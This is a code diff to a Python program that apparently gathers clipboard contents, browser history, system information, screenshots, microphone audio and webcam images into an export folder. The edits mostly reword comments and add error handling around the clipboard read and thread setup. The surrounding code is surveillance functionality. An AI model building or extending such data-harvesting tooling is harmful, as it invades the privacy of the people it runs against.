@@ -357,7 +357,7 @@ def main():
                 commands.kill()
                 commands.communicate()
 
-    # If IO error occurs with file #
+    # If error occurs during file operation #
     except (OSError, IOError) as file_err:
         PrintErr(f'Error occurred during file operation: {file_err}')
         logging.exception(f'Error occurred during file operation: {file_err}\n\n')
@@ -392,7 +392,7 @@ def main():
                                 command.kill()
                                 command.communicate()
 
-        # If IO error during file operation #
+        # If error occurs during file operation #
         except (IOError, OSError) as file_err:
             PrintErr(f'Error occurred during file operation: {file_err}')
             logging.exception(f'Error occurred during file operation: {file_err}\n\n')
@@ -440,24 +440,32 @@ def main():
                 get_sysinfo.kill()
                 get_sysinfo.communicate()
 
-    # If IO error during file operation #
+    # If error occurs during file operation #
     except (IOError, OSError) as file_err:
         PrintErr(f'Error occurred during file operation: {file_err}')
         logging.exception(f'Error occurred during file operation: {file_err}\n\n')
 
     # If OS is Windows #
     if os.name == 'nt':
-        # Copy the clipboard #
-        win32clipboard.OpenClipboard()
-        pasted_data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
+        try:
+            # Access the clipboard #
+            win32clipboard.OpenClipboard()
+            # Copy the clipboard data #
+            pasted_data = win32clipboard.GetClipboardData()
+
+        except (OSError, TypeError):
+            pasted_data = ''
+
+        finally:
+            # Close the clipboard #
+            win32clipboard.CloseClipboard()
 
         try:
             # Write the clipboard contents to output file #
             with open(f'{export_path}clipboard_info.txt', 'w') as clipboard_info:
                 clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
 
-        # If IO error during file operation #
+        # If error occurs during file operation #
         except (IOError, OSError) as file_err:
             PrintErr(f'Error occurred during file operation: {file_err}')
             logging.exception(f'Error occurred during file operation: {file_err}\n\n')
@@ -477,7 +485,7 @@ def main():
         with open(browser_file, 'w') as browser_txt:
             browser_txt.write(json.dumps(browser_history))
 
-    # If IO error during file operation #
+    # If error occurs during file operation #
     except (IOError, OSError) as file_err:
         PrintErr(f'Error occurred during file operation: {file_err}')
         logging.exception(f'Error occurred during file operation: {file_err}\n\n')
@@ -487,7 +495,7 @@ def main():
     p1.start()
     p2 = Process(target=Screenshot, args=(export_path,))
     p2.start()
-    p3 = Thread(target=Microphone, args=(export_path,))
+    p3 = Thread(target=Microphone, daemon=True, args=(export_path,))
     p3.start()
     p4 = Process(target=Webcam, args=(export_path,))
     p4.start()
